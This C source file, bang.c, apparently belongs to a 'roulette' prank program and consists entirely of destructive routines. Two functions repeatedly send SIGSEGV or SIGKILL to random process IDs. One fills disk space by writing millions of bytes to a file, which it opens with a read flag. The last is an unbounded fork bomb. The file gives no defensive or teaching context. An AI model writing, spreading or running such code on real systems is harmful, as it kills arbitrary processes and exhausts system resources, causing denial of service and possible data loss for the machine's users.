/*
 * bang.c
 *
 * Licensed under GNU GPL v3
 * By Thomas Murgia <garuda1@protonmail.com>
 *
 */

#define _POSIX_C_SOURCE 200809L

#include <roulette.h>
#include <unixlib.h>
#include <signal.h>
#include <unistd.h>
#include <unixlib-io.h>

void segfault_rand(void)
{
  my_puts("Segfaulting a random PID!\n");
  while (!kill(randpid(), SIGSEGV));
}

void sigkill_rand(void)
{
  my_puts("SIGKILLing a random PID!\n");
  while (!kill(randpid(), SIGKILL));
}

void waste_disk(void)
{
  int i;
  int fd;

  my_puts("Wasting disk space!\n");
  fd = my_openfd("lol", OPEN_READ);
  i = 0;
  while (i++ != 2147483)
    my_fdputc(fd, '0');
  my_closefd(fd);
}

void fork_bomb(void)
{
  my_puts("Fork bomb!\n");
  while (1)
    fork();
}
